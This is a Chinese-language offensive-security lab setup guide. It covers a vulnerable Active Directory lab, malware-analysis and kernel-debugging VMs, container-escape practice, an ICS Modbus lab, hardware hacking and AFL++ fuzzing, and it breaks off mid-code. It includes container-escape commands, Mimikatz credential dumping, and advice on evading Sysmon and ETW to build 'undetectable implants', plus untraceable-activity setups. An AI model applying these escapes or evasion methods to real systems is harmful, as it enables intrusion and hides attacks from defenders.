### 手工搭建 AD 实验环境（GOAD 硬件不足时的退路）

对于 GOAD 的 5 台虚拟机需求超出承载能力的层级 1 硬件，可手工搭建一个最小的 2 虚拟机 AD 实验环境。

```powershell
# ---- 在 Windows Server 2022 虚拟机（未来的 DC01）上 ----

# 提升为域控制器
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
Install-ADDSForest `
    -DomainName "lab.local" `
    -DomainNetbiosName "LAB" `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "Lab@dm1n2027!" -AsPlainText -Force) `
    -InstallDns `
    -Force

# 重启后：填充存在漏洞的对象
# （提升为域控后，以域管理员身份运行以下命令）

# 创建存在漏洞的服务账号（可被 Kerberoasting）
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/dc01.lab.local:1433"}

New-ADUser -Name "svc_backup" -SamAccountName "svc_backup" -AccountPassword (ConvertTo-SecureString "Backup2024" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity "svc_backup" -ServicePrincipalNames @{Add="BackupSvc/dc01.lab.local"}

# 创建可被 AS-REP roasting 的账号（无需 Kerberos 预认证）
New-ADUser -Name "asrep_user" -SamAccountName "asrep_user" -AccountPassword (ConvertTo-SecureString "AsRep2024!" -AsPlainText -Force) -Enabled $true
Set-ADAccountControl -Identity "asrep_user" -DoesNotRequirePreAuth $true

# 创建使用弱口令的账号（用于口令喷洒）
$weakPasswords = @("Password1", "Summer2024!", "Welcome1", "Company123")
for ($i = 1; $i -le 4; $i++) {
    New-ADUser -Name "user$i" -SamAccountName "user$i" `
        -AccountPassword (ConvertTo-SecureString $weakPasswords[$i-1] -AsPlainText -Force) `
        -Enabled $true
}

# 配置无约束委派（极易被利用）
New-ADComputer -Name "WEB01" -AccountPassword (ConvertTo-SecureString "Web01Pass!" -AsPlainText -Force)
Set-ADComputer -Identity "WEB01" -TrustedForDelegation $true

# 配置 ACL 错误设置：授予 user1 对 svc_sql 的 GenericAll 权限
$user1 = Get-ADUser "user1"
$svc_sql = Get-ADUser "svc_sql"
$acl = Get-Acl "AD:\$($svc_sql.DistinguishedName)"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $user1.SID,
    "GenericAll",
    "Allow"
)
$acl.AddAccessRule($ace)
Set-Acl -AclObject $acl "AD:\$($svc_sql.DistinguishedName)"

# ---- 在 Windows 11 虚拟机上 ----
# 加入 lab.local 域
$domainCredential = Get-Credential LAB\Administrator
Add-Computer -DomainName "lab.local" -Credential $domainCredential -Restart

# ---- 在 Kali 上：采集 BloodHound 数据 ----
# 把 SharpHound 采集器下载到 Windows 虚拟机并运行：
# .\SharpHound.exe -c All --zipfilename bh_lab.zip
# 把 .zip 复制到 Kali，导入 BloodHound

# 在 Kali 上启动 BloodHound：
sudo neo4j start
bloodhound &
# 默认凭据：neo4j / neo4j（首次登录后修改）
# 上传：把 SharpHound 的 .zip 拖入 BloodHound 界面
```

---

## 10. 恶意软件分析环境

三个组件协同工作，各有明确分工。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/5._Malware_Analysis_Environment.png" alt="Malware Analysis Environment" width="750"/>

</td></tr></table>
</div>

### 10.1 FLARE-VM 搭建

FLARE-VM 是 Mandiant 出品的 Windows 恶意软件分析发行版。在一台可联网的全新 Windows 10 22H2 虚拟机中运行安装器。**安装完成后，断开互联网并把当前状态做成干净基线快照。**

```powershell
# 环境要求：
# - Windows 10 22H2（不要 Windows 11：部分工具有兼容性问题）
# - 8 GB 内存、150 GB 存储、4 个 vCPU
# - 全新安装、完成全部更新后再运行安装器
# - 运行前先关闭 Windows Defender（否则会干扰）

# 步骤 1：关闭 Windows Defender 实时防护
Set-MpPreference -DisableRealtimeMonitoring $true

# 步骤 2：以管理员身份打开 PowerShell

# 步骤 3：设置执行策略
Set-ExecutionPolicy Unrestricted -Force
$ErrorActionPreference = "Continue"

# 步骤 4：下载并运行 FLARE-VM 安装器
(New-Object net.webclient).DownloadFile(
    'https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',
    "$([Environment]::GetFolderPath('Desktop'))\install.ps1"
)
Unblock-File "$([Environment]::GetFolderPath('Desktop'))\install.ps1"
Set-ExecutionPolicy Unrestricted -Force

# 步骤 5：运行安装器（交互式选择工具，或直接使用默认值）
.\install.ps1

# 安装耗时 1 到 2 小时，过程中会自动重启数次。
# 完成后：创建快照，命名为 "FLARE-VM-CLEAN-BASELINE"
# 断开互联网：把网卡改为仅实验网或 None
```

**FLARE-VM 安装的内容（部分亮点）：**

```
逆向工程：              IDA Free, Ghidra, Binary Ninja demo, x64dbg, x32dbg, Cutter, radare2
                        Detect-It-Easy, PEiD, ExeinfoPE, PEview, CFF Explorer, PE-bear
调试：                  x64dbg（主力）, OllyDbg, WinDbg（通过 WDK）
反汇编：                IDA Free, Ghidra, Binary Ninja demo, Cutter
内存分析：              Volatility 3, Volatility 2
网络：                  Wireshark, FakeNet-NG, Inetsim, Burp Suite Community
Office/宏：             oletools, ViperMonkey, oledump, olevba
.NET 分析：             dnSpyEx, dotPeek, de4dot
PDF 分析：              PDF-tools, Peepdf
脚本分析：              JStillery, JS Beautifier
实用工具：              7zip, HxD, Notepad++, Process Hacker, ProcMon, ProcDot, Regshot
```

### 10.2 REMnux 搭建

REMnux 是 FLARE-VM 在 Linux 侧的对应物。用它做网络层分析、脚本反混淆、内存取证，以及检查运行在 Linux 上的恶意软件。

```bash
# 下载 REMnux OVA：https://remnux.org
# 导入 VMware：File > Import Virtual Machine > 选择 OVA
# 默认凭据：remnux / malware

# 导入后：更新 REMnux
remnux upgrade

# REMnux 预装的关键工具（无需额外配置）：
# 网络分析：Wireshark, tcpdump, Zeek, NetworkMiner（通过 WINE）, netcat
# 内存取证：Volatility 3, Volatility 2, bulk_extractor
# 脚本分析：  JStillery, PyCDC, box-js（JavaScript 反混淆）
# PDF 分析：     pdf-parser, pdfid, peepdf, PDFStreamDumper
# Office 宏：    oletools（olevba, oledump, mraptor）, xlmdeobfuscator
# PE 分析：      readpe, pefile, peframe, pescanner
# 字符串提取：FLOSS（FireEye/Mandiant 增强版 strings 工具）
# 沙箱工具：inetsim（为恶意软件模拟互联网服务）

# Linux 上的 FakeNet-NG 等价物（拦截并记录恶意软件的网络调用）：
sudo inetsim
# 此后 REMnux 会为其网络内任何虚拟机应答 DNS、HTTP、HTTPS、SMTP
# 把恶意软件虚拟机的 DNS 指向 REMnux 的 IP，即可捕获全部出站流量

# 把 REMnux 配置为 CAPE 沙箱的伪互联网：
# 在 CAPE 沙箱配置中：把 "resultserver" 设为 REMnux 的 IP
```

### 10.3 CAPE 沙箱搭建

CAPE 是 Cuckoo Sandbox 的持续维护继任者。它执行自动化恶意软件引爆：在 Windows 虚拟机中执行样本、记录 API 调用、抓取网络流量，并提取恶意软件配置。

```bash
# 在 Ubuntu 20.04 虚拟机上搭建 CAPE（Ubuntu 22.04 存在部分依赖冲突）
# 虚拟机要求：4 vCPU、8 GB 内存、100 GB 存储
# 该虚拟机在初始搭建阶段需要 NAT 访问，之后再重新配置

# 安装 CAPE
git clone https://github.com/kevoreilly/CAPEv2
cd CAPEv2

# 运行安装脚本（自动安装全部依赖）
sudo -E bash installer/cape2.sh base cape

# CAPE 底层使用 KVM 运行分析用虚拟机
# 你需要一个干净的 Windows 7 或 Windows 10 虚拟机镜像作为 "guest"：
# 下载 Windows 10 22H2 评估版 ISO
# Install in KVM with: sudo virt-install --name win10 --ram 4096 --vcpus 2 \
#   --disk size=60 --cdrom /path/to/win10.iso --os-type windows

# 在 Windows 分析虚拟机中安装 CAPE agent：
# 把 CAPEv2/agent/agent.py 复制到 Windows 虚拟机桌面
# 设为开机自启：HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# 启动 CAPE 服务
sudo systemctl start cape-rooter
sudo systemctl start cape-web
sudo systemctl start cape

# 访问 Web 界面：http://CAPE_VM_IP:8000
# 通过 Web 界面或 API 提交样本：
curl -F file=@malware_sample.exe http://10.10.10.70:8000/tasks/create/file/
```

---

## 11. 内核调试环境

**两套独立配置：** 一套用于 Linux 内核研究（QEMU + GDB），一套用于 Windows 内核研究（WinDbg + VirtualKD-Redux）。

### 11.1 Linux 内核调试：QEMU + GDB

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/6._Linux_Kernel_Debugging-QEMU_+_GDB.png" alt="Linux Kernel Debugging: QEMU + GDB" width="540"/>

</td></tr></table>
</div>

```bash
# ---- 构建启用调试的内核 ----
# （在 Ubuntu 开发机或 Kali 上运行）

sudo apt install -y git build-essential libncurses-dev bison flex libssl-dev libelf-dev

# 克隆内核源码（练习时使用已知存在漏洞的版本）
# Linux 5.15 LTS：使用广泛，有大量公开的 CVE 分析文章
wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.15.tar.xz
tar -xf linux-5.15.tar.xz && cd linux-5.15

# 配置调试相关选项
make defconfig
scripts/config --enable  CONFIG_DEBUG_INFO
scripts/config --enable  CONFIG_DEBUG_INFO_DWARF5
scripts/config --enable  CONFIG_GDB_SCRIPTS
scripts/config --enable  CONFIG_KGDB
scripts/config --enable  CONFIG_KASAN
scripts/config --enable  CONFIG_KCOV         # 覆盖率：syzkaller 需要
scripts/config --enable  CONFIG_FRAME_POINTER
scripts/config --disable CONFIG_RANDOMIZE_BASE  # 仅在本地调试时关闭 KASLR
scripts/config --disable CONFIG_STACKPROTECTOR
scripts/config --set-val CONFIG_SLAB y

make -j$(nproc)   # 视硬件情况需要 10 到 30 分钟

# ---- 用 busybox 构建最小 rootfs ----
wget https://busybox.net/downloads/busybox-1.36.1.tar.bz2
tar -xf busybox-1.36.1.tar.bz2 && cd busybox-1.36.1

make defconfig
scripts/config --enable CONFIG_STATIC
make -j$(nproc) && make install

mkdir -p ../rootfs/{bin,sbin,etc,proc,sys,dev,tmp}
cp -a _install/* ../rootfs/

cat > ../rootfs/init << 'INITEOF'
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t tmpfs none /tmp
echo "Kernel: $(uname -r)"
echo "Hostname: $(hostname)"
setsid /bin/sh -c 'exec /bin/sh </dev/ttyS0 >/dev/ttyS0 2>&1'
INITEOF
chmod +x ../rootfs/init
(cd ../rootfs && find . | cpio -o --format=newc | gzip > ../rootfs.cpio.gz)

# ---- 带 GDB stub 启动 QEMU ----
qemu-system-x86_64 \
    -kernel arch/x86/boot/bzImage \
    -initrd rootfs.cpio.gz \
    -append "console=ttyS0 nokaslr nopti nosmap nosmep oops=panic panic=1" \
    -nographic \
    -s -S \
    -m 512M \
    -enable-kvm
# -s：在 :1234 上开启 GDB 服务端
# -S：暂停执行，直到 GDB 连接

# ---- 连接 GDB（在新终端中）----
gdb vmlinux
(gdb) target remote :1234
(gdb) continue
# 按 Ctrl+C 中断，然后：
(gdb) b commit_creds
(gdb) b prepare_kernel_cred
(gdb) info breakpoints
```

### 11.2 Windows 内核调试：WinDbg + VirtualKD-Redux

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/7._Windows_Kernel_Debugging-WinDbg_+_VirtualKD-Redux.png" alt="Windows Kernel Debugging: WinDbg + VirtualKD-Redux" width="720"/>

</td></tr></table>
</div>

```powershell
# ---- 在目标虚拟机（win11-kdbg：10.10.10.80）上 ----
# 所有命令均以管理员身份运行

# 启用通过网络进行内核调试
bcdedit /debug on
bcdedit /dbgsettings net hostip:10.10.10.X port:50000 key:1.2.3.4
# 把 10.10.10.X 换成你调试机（或 Kali）的 IP
# key 可任意取值："1.2.3.4" 用于实验环境足够

# 启用测试签名（加载未签名驱动的必需项：HEVD 等）
bcdedit /set testsigning on

# 关闭内核代码完整性校验（便于加载未签名驱动）
bcdedit /set nointegritychecks on

# 可选：为驱动研究关闭 HVCI（虚拟化层保护的代码完整性）
# 这需要先关闭基于虚拟化的安全性：
# 设置 > Windows 安全中心 > 设备安全性 > 内核隔离 > 内存完整性 > 关闭

# 在目标虚拟机上安装 VirtualKD-Redux：
# 下载：https://github.com/4d61726b/VirtualKD-Redux/releases
# 解压后运行：vminstall.exe（安装 vmmon 驱动）

# 重启目标虚拟机
Restart-Computer -Force
```

```powershell
# ---- 在调试机（或运行 WinDbg 的宿主）上 ----

# 安装 WinDbg Preview（免费）
winget install Microsoft.WinDbgPreview

# 调试机上也需安装 VirtualKD-Redux：
# 启动 WinDbg 之前先运行 vmmon64.exe
# vmmon64 会创建 KD 将要连接的 VMware 管道

# 配置符号路径（关键：没有符号，WinDbg 几乎无法使用）
$env:_NT_SYMBOL_PATH = "srv*C:\Symbols*https://msdl.microsoft.com/download/symbols"
# 把这一项永久加入系统环境变量

# 让 WinDbg 连接目标机：
# WinDbg Preview > File > Attach to Kernel > Net 标签页
#   端口：50000
#   密钥：1.2.3.4
# 点击 OK 等待连接（目标虚拟机必须已运行，且在执行 bcdedit 后重启过）
```

```
阶段 3 必备的 WinDbg 内核命令：

g                              -- 继续执行
Ctrl+Break                     -- 中断进入调试器

.reload /f                     -- 强制重新加载符号（连接后执行）
lm                             -- 列出已加载模块及其地址
lm m HEVD                      -- 显示 HEVD.sys 基址
!analyze -v                    -- 分析当前 bugcheck/崩溃

dt nt!_EPROCESS                -- 显示 EPROCESS 结构布局
dt nt!_EPROCESS <addr>         -- 查看指定地址上的进程
!process 0 0                   -- 列出所有进程
!process 0 15                  -- 列出所有进程及完整详情

-- TOKEN 偏移（Windows 11 23H2 build 22631）：
-- 务必用 dt nt!_EPROCESS 核对（偏移随 build 变化）
-- UniqueProcessId:    0x440
-- ActiveProcessLinks: 0x448
-- Token:              0x4B8

dd <addr>                      -- 显示指定地址的 DWORD
dq <addr>                      -- 显示指定地址的 QWORD
dq poi(<addr>)                 -- 解引用指针后再显示
u <addr>                       -- 反汇编指定地址
u <addr> L20                   -- 反汇编 20 条指令
bp nt!NtCreateFile             -- 在内核函数上设软件断点
ba w8 <addr>                   -- 在 8 字节写上设硬件断点
be 1                           -- 启用断点 1
bd 1                           -- 禁用断点 1

-- 用于令牌窃取漏洞利用开发：
r                              -- 显示所有寄存器
r rax=0x0                      -- 设置寄存器的值
eb <addr> 90                   -- 把字节补丁为 NOP（0x90）

-- 池与堆分析：
!pool <addr>                   -- 池块信息
!poolused                      -- 按 tag 统计的池使用量
!heap -s                       -- 堆摘要
```

```powershell
# 安装 HEVD（Hacksys Extreme Vulnerable Driver）用于内核漏洞利用练习
# 下载预编译版本：https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases
# 在目标虚拟机上加载驱动：
sc.exe create HEVD type=kernel binPath="C:\HEVD\HEVD.sys"
sc.exe start HEVD
# 验证：设备管理器 > 查看 > 显示隐藏的设备 > 检查是否有 HEVD
# 然后从调试机一侧用 Python/C 漏洞利用代码发起利用
```

---

## 12. 容器攻击实验环境

阶段 4F 涵盖 Docker/Kubernetes 逃逸。练习环境：引爆期间与你的实验网络隔离。

```bash
# 在 Ubuntu 开发机或 Kali 上
# Docker 已安装（第 7 节的配置）

# 拉取故意留有漏洞的容器用于练习
docker pull vulnerables/web-dvwa          # DVWA（Web 漏洞）
docker pull metasploitable/metasploitable3
docker pull webgoat/goat-and-wolf         # OWASP WebGoat

# 启动特权容器（容器逃逸的目标）
docker run -it --privileged ubuntu:20.04 bash
# 进入容器后挂载宿主文件系统：
# mkdir /mnt/host && mount /dev/sda1 /mnt/host
# chroot /mnt/host  -> 此时你已是宿主上的 root

# 练习 docker.sock 逃逸：
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:20.04 bash
# 进入容器后执行：apt install -y docker.io
# docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu:20.04 chroot /host

# 搭建 Kubernetes 练习环境（本地，使用 k3s：轻量 K8s）
curl -sfL https://get.k3s.io | sh -
# 验证集群
kubectl get nodes
# 部署存在漏洞的 Pod
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

# 容器安全扫描（了解防守方用什么）
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
    aquasec/trivy image ubuntu:20.04

# grype（Anchore 的漏洞扫描器：蓝队会用它扫你的镜像）
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin
grype ubuntu:20.04
```

---

## 13. 云端实验环境替代方案

对于层级 1 的硬件，或想在不为云资源花钱的前提下练习云相关攻击，可以使用以下免费/低成本替代方案。

### 免费练习平台

```
HackTheBox Pro Labs：
  Offshore    -- 完整企业 AD 环境，多域
  RastaLabs   -- 侧重 AD，带现代防御（LAPS、分层模型）
  Cybernetics -- 进阶：完整网络，目标已加固
  费用：约 $14/月，可获实验室 VIP 访问

PwnTillDawn：
  https://www.pwntilldawn.com
  免费，提供 AD 环境，知名度较低

TryHackMe（入门到阶段 2）：
  https://tryhackme.com
  约 $14/月，有引导，非常适合阶段 0 到 2 的结构化学习
```

### AWS 免费套餐实验环境

```bash
# AWS 免费套餐：t2.micro（1 vCPU、1 GB 内存）每月 750 小时，为期 12 个月
# 够用范围：一台最小 Kali 虚拟机或一台目标虚拟机

# 安装 AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# 配置凭据（先在 AWS 控制台创建 IAM 用户）
aws configure

# 启动 Kali 实例（免费套餐只能用 t2.micro：仅供练习，不做重活）
aws ec2 run-instances \
    --image-id ami-0123456789abcdef0 \   # Find current Kali AMI in AWS Marketplace
    --instance-type t2.micro \
    --key-name your-key-pair \
    --security-groups "lab-sg"

# 专门练习云攻击时：
# 部署故意错误配置的环境：
# CloudGoat（Rhino Security Labs）：https://github.com/RhinoSecurityLabs/cloudgoat
pip3 install cloudgoat --break-system-packages
cloudgoat create vulnerable_lambda

# IAM Vulnerable（含 IAM 错误配置的 CloudFormation 模板）：
# https://github.com/BishopFox/iam-vulnerable
```

---

## 14. 作战安全层：Whonix + Qubes

**用途：** 作战安全研究、匿名侦察，以及任何绝不能追溯到真实 IP 的活动。
**不用于：** 针对你自己实验虚拟机的攻击流量（这类流量直接走实验网络）。

### Whonix 搭建

Whonix 是双虚拟机系统：Gateway 把所有流量经 Tor 转发，Workstation 承担你的工作。即使 Workstation 被你正在分析的恶意软件攻陷，真实 IP 也不会泄露，因为网络完全由 Gateway 处理。

```bash
# 下载 Whonix OVA（两个文件：Gateway 与 Workstation）
# https://www.whonix.org/wiki/VirtualBox

# 先导入 Gateway：
# VirtualBox：File > Import Appliance > 选择 Whonix-Gateway-*.ova
# VirtualBox：File > Import Appliance > 选择 Whonix-Workstation-*.ova

# 若用 VMware：下载 .ova 后通过 File > Import Virtual Machine 导入

# 网络配置（关键：必须完全一致）：
# Whonix-Gateway：
#   网卡 1：NAT（经 Tor 访问互联网）
#   网卡 2：内部网络，名称："Whonix"

# Whonix-Workstation：
#   网卡 1：内部网络，名称："Whonix"  -- 与 Gateway 的网卡 2 同名

# 先启动 Gateway，再启动 Workstation
# 两者默认凭据均为：user / changeme

# 首次启动后更新两台虚拟机：
sudo apt update && sudo apt dist-upgrade -y
```

### Qubes OS（最大化隔离）

Qubes 把每项活动放在独立的虚拟机（称为 "qube"）中运行。一个 qube 被攻陷影响不到其他 qube。在一个 qube 里浏览、在另一个里做研究、在第三个里构建工具。即使你的研究 qube 被恶意软件攻陷，构建 qube 与个人数据也毫发无损。

Qubes 是对宿主机的完整操作系统替换：它就是宿主。

```
安装：https://www.qubes-os.org/downloads/
硬件要求：16 GB 内存起步，推荐 32 GB
          VT-x + VT-d（IOMMU）必需：检查 BIOS 设置
推荐机型：Framework 13/16、Lenovo ThinkPad X1 Carbon（查 HCL）
硬件兼容性列表：https://www.qubes-os.org/hcl/

BlackHAT 操作员的 Qube 划分：
  dom0:      宿主域（绝不要在此安装任何东西）
  sys-net:   负责网络硬件（已隔离）
  sys-vpn:   把所有流量经 Mullvad VPN 转发
  sys-whonix: 经 Tor 转发（Qubes-Whonix 集成）
  kali-qube:  攻击工具（Fedora 或 Debian 基础 + 已装 Kali 工具）
  dev-qube:   开发环境（Ubuntu 22.04 模板）
  research:   联网研究（与开发环境分开）
  vault:      完全离线：口令、密钥、敏感文件
```

---

## 15. 检测可见性层：DetectionLab

理解你攻击时防守方看到什么，正是操作员与脚本小子的分水岭。DetectionLab 置备完整的 Windows AD 环境，并预配置 Splunk、Sysmon（使用 SwiftOnSecurity 规则集）、Zeek 与 Velociraptor。先攻击你自己的实验环境，再切到 Splunk 仪表盘，看看你的攻击在日志里是什么样子。你就是这样练出不可检测的作业手法的。

```bash
# DetectionLab 要求：16 GB 内存、4 个 vCPU、80 GB 存储
# 最好在层级 2 或层级 3 硬件上运行
# https://github.com/clong/DetectionLab

# 方式 1：Vagrant（VMware 或 VirtualBox）
git clone https://github.com/clong/DetectionLab.git
cd DetectionLab/Vagrant

# 安装 Vagrant（若尚未安装）
# 检查 Vagrantfile，必要时调整内存分配：
# 默认：每台虚拟机 8 GB（logger + DC + WEF + win10）：合计 32 GB

vagrant up --provider=vmware_desktop
# 或者：
vagrant up --provider=virtualbox

# 置备耗时 1 到 2 小时（下载 Windows 评估版 ISO + 安装工具）

# 置备完成后，各项服务的访问地址：
# Splunk:        https://192.168.56.105:8000    (admin/changeme)
# Fleet/Kolide:  https://192.168.56.105:8412
# Velociraptor:  https://192.168.56.105:9999
# RDP 到 DC：    192.168.56.102  (vagrant/vagrant)
# RDP 到 Win10： 192.168.56.104  (vagrant/vagrant)
```

### 用 DetectionLab 打磨作业手法

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/8._Using_DetectionLab_for_Tradecraft_Development.png" alt="Using DetectionLab for Tradecraft Development" width="1100"/>

</td></tr></table>
</div>

```bash
# 示例：运行 Mimikatz，看看 Sysmon 抓到了什么
# 在 Win10 虚拟机（192.168.56.104）上：
# 下载 Mimikatz，运行：sekurlsa::logonpasswords
# 切到 Splunk：index=main EventCode=4688 process_name=mimikatz*
# 你会看到：ProcessCreate 事件、记录下来的 CommandLine、ParentProcess 链

# 经验：下一轮改用反射加载运行 Mimikatz（不落盘）
# 对比日志：磁盘事件消失，但进程仍可见
# 再进一步：用间接系统调用绕过 ETW：没有 API 日志
# 这个循环就是打造不可检测植入物的方法
```

---

## 16. ICS/SCADA 实验环境

阶段 4G 涵盖 ICS/SCADA 攻击。该实验环境在阶段 4G 之前是可选的，但值得提前搭好。

### 拓扑

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/9._ICS-SCADA_Lab-Topology.png" alt="ICS SCADA Lab Topology" width="580"/>

</td></tr></table>
</div>

### ICS 实验环境搭建

```bash
# OpenPLC Runtime（模拟 PLC，支持 Modbus/TCP 与 EtherNet/IP）
# 运行在 ICS 网段的 Ubuntu 20.04 虚拟机（192.168.200.10）上

# 安装 OpenPLC
git clone https://github.com/thiagoralves/OpenPLC_v3.git
cd OpenPLC_v3
./install.sh linux

# 启动 OpenPLC Runtime
sudo ./start_openplc.sh

# 访问 Web 界面：http://192.168.200.10:8080
# 默认凭据：openplc / openplc
# 上传一个简单的 PLC 程序（.st 文件）来模拟真实工艺过程

# 在第二台虚拟机（192.168.200.11）上安装 ScadaBR（HMI）
sudo apt install -y default-jdk tomcat9
wget https://sourceforge.net/projects/scadabr/files/latest/download -O scadabr.zip
unzip scadabr.zip
sudo cp ScadaBR.war /var/lib/tomcat9/webapps/
sudo systemctl restart tomcat9
# 访问：http://192.168.200.11:8080/ScadaBR

# Kali 上的 Modbus 攻击工具（已安装，或通过 pip 安装）：
pip3 install pymodbus --break-system-packages

# 测试到 OpenPLC 的 Modbus 连通性：
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('192.168.200.10', port=502)
c.connect()
# 读取保持寄存器（工艺数值）
result = c.read_holding_registers(0, 10)
print('Registers:', result.registers)
# 写线圈（关闭一路工艺输出）
c.write_coil(0, False)
print('Coil written: process output disabled')
c.close()
"

# Nmap ICS 扫描（使用 Redpoint 的 NSE 脚本）
git clone https://github.com/digitalbond/Redpoint.git
nmap --script Redpoint/s7-info.nse -p 102 192.168.200.10    # Siemens S7
nmap --script Redpoint/enip-info.nse -p 44818 192.168.200.10 # EtherNet/IP
nmap --script Redpoint/modbus-discover.nse -p 502 192.168.200.10
```

---

## 17. 硬件破解实验环境

阶段 4G 还涵盖物理硬件：JTAG/SWD 提取、UART 控制台接入、芯片毛刺攻击、射频攻击。这个实验环境需要真实硬件，任何虚拟机都无法替代。

### 硬件清单

```
优先级 1（阶段 4G 之前购入）：
  Flipper Zero ($200)           -- RFID 125kHz/13.56MHz、NFC、sub-GHz 射频、红外、iButton
                                   https://flipperzero.one
                                   固件：保持更新，Unleashed 或 RogueMaster 可扩展频率范围
  Bus Pirate v4 ($40)           -- UART、SPI、I2C、1-Wire 协议分析仪
                                   https://buspirate.com
  USB-to-UART adapter ($5)      -- CP2102 或 CH340G：用于路由器/物联网设备的 UART 控制台接入

优先级 2（阶段 4G 进行中）：
  Proxmark3 RDV4 ($350)         -- 专业 RFID 研究工具，支持 NFC 与克隆
                                   https://proxmark.com
  Logic Analyzer ($15-$40)      -- Saleae 兼容版（8 通道）：捕获并解码 SPI/I2C/UART
                                   通过 USB 连接到 Kali，用 PulseView（sigrok）解码
  JLink EDU Mini ($20)          -- 用于 ARM 微控制器的 JTAG/SWD 调试器
                                   https://www.segger.com/products/debug-probes/j-link/models/j-link-edu-mini/

优先级 3（高级硬件研究）：
  ChipWhisperer Lite ($300)     -- 侧信道分析与电压毛刺绕过
                                   https://rtfm.newae.com/Starter-Tools/ChipWhisperer-Lite/
  HackRF One ($300) + PortaPack  -- 软件定义无线电（SDR）：射频侦察、重放攻击
                                   https://greatscottgadgets.com/hackrf/
  RFCat ($120)                  -- Sub-GHz 收发器：车库门、车钥匙、遥控器

物理实验工具：
  Heat gun                      -- 从 PCB 上拆焊芯片
  Soldering station             -- 焊接 SPI/JTAG 测试点接线
  Digital multimeter            -- 电压、通断与元件测试
  USB power bank                -- 分析期间为目标硬件提供隔离供电
  Magnification loupe (10x)     -- 读取 IC 丝印以识别芯片
```

### 硬件实验工作流

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/10_Hardware_Lab_Workflow.png" alt="Hardware Lab Workflow" width="700"/>

</td></tr></table>
</div>

```bash
# UART 控制台接入流程
# 接线：目标 TX -> Bus Pirate RX，目标 RX -> Bus Pirate TX，GND -> GND

# 用 minicom 接入 UART 控制台
sudo apt install -y minicom
sudo minicom -D /dev/ttyUSB0 -b 115200 -o

# 未知波特率时可自动探测：
# 使用 Craig Heffner 的 uart-tools 中的 baudrate.py
python3 baudrate.py /dev/ttyUSB0

# 用 binwalk 提取固件
sudo apt install -y binwalk
binwalk -e firmware.bin             # 提取所有可识别的文件系统
binwalk --dd=".*" firmware.bin      # 提取全部内容（激进模式）
ls _firmware.bin.extracted/         # 查看提取出的文件

# 用 QEMU 模拟提取出的固件（适用于 ARM 路由器）
sudo apt install -y qemu-user-static
chroot _firmware.bin.extracted/squashfs-root qemu-arm-static /bin/sh
# 现在你正在自己的机器上运行路由器的 shell
```

---

## 18. 漏洞研究与模糊测试实验环境（阶段 5：GREATEST）

阶段 5 的重心从“用工具打已知目标”转向“在系统级关键软件中发现原创漏洞”。常规的渗透测试或恶意软件分析实验环境不足以支撑这一层级：现代模糊测试与漏洞研究需要海量 CPU 吞吐、内核级覆盖率插桩、专用内存盘和确定性调试框架。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/Lab_Setup_Guide/13._NEW_Vulnerability Research &_Fuzzing_Lab_(Phase_5-GREATEST).png" alt="Fuzzing Research Lab" width="1000"/>

</td></tr></table>
</div>

---

### 18.1 高吞吐 AFL++ 模糊测试机

测试用例每秒变异成千上万次，模糊测试会产生巨大的磁盘 I/O。让模糊测试器直接跑在 SSD 上会损耗驱动器寿命并拖慢执行速度。正确的做法是运行在内存盘（`tmpfs`）上，并配合专用 CPU 核绑定。

```bash
# 1. 为输入/输出队列准备专用内存盘
sudo mkdir -p /mnt/ramdisk
sudo mount -t tmpfs -o size=16G tmpfs /mnt/ramdisk
mkdir -p /mnt/ramdisk/in /mnt/ramdisk/out

# 2. CPU 配置：关闭调频策略以获得最高性能
echo performance | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor

# 3. 系统 core dump 与崩溃通知调优
sudo sh -c 'echo core > /proc/sys/kernel/core_pattern'
sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space' # For deterministic reproduction only

# 4. 安装支持完整 LLVM/Clang LTO 的 AFL++
sudo apt update && sudo apt install -y build-essential clang llvm lld libglib2.0-dev libpixman-1-dev
git clone https://github.com/AFLplusplus/AFLplusplus ~/AFLplusplus
cd ~/AFLplusplus
make distrib
sudo make install
```

#### 持久化模式测试夹具模板

持久化模式（`__AFL_LOOP`）通过在内存中循环调用目标 API 函数，避开 `fork()` 的开销。相比标准的 forkserver 执行方式，可获得 10 到 100 倍的加速：

```c
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// 模拟的目标解析函数
int target_parser(const uint8_t *data, size_t size);

__AFL_FUZZ_INIT();

int main(int argc, char **argv) {
    #ifdef __AFL_HAVE_MANUAL_CONTROL
    __AFL_INIT();
    #endif

    unsigned char *buf = __AFL_FUZZ_TESTCASE_BUF;

    // 循环 100,000 次后回收进程以清理状态
    while (__AFL_LOOP(100000)) {
